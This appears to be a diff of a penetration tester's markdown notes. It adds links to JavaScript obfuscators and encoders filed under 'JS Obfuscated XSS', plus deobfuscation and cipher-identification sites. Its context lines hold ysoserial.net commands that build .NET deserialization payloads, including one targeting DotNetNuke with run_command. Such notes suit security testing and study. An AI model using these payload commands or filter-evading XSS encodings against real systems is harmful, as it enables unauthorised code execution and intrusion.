@@ -1,3 +1,13 @@
+https://www.toptal.com/developers/javascript-minifier
+https://beautifytools.com/javascript-obfuscator.php#
+https://obfuscator.io/legacy-playground
+
+### JS Obfuscated XSS:
+https://jsfuck.com/ 
+https://utf-8.jp/public/jjencode.html
+https://utf-8.jp/public/aaencode.html
+
+Test obfuscated code in: https://jsconsole.com/
 
 ```
 wine ~/g1gs/tools/ysoserial.net/ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping 127.0.0.1"  
@@ -21,12 +31,15 @@ wine ~/g1gs/tools/ysoserial.net/ysoserial.exe -p DotNetNuke -m run_command -c "C
 
 # Deobfuscation Websites
 
-|**Website**|
-|---|
-|[JS Console](https://jsconsole.com)|
-|[Prettier](https://prettier.io/playground/)|
-|[Beautifier](https://beautifier.io/)|
-|[JSNice](http://www.jsnice.org/)|
+| **Website**                                     |
+| ----------------------------------------------- |
+| [JS Console](https://jsconsole.com)             |
+| [Prettier](https://prettier.io/playground/)     |
+| [Beautifier](https://beautifier.io/)            |
+| [JSNice](http://www.jsnice.org/)                |
+| [UnPacker](https://matthewfl.com/unPacker.html) |
+# Encryption/Obfuscation Detection:
+- [Cipher Identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)
 
 # Misc
 
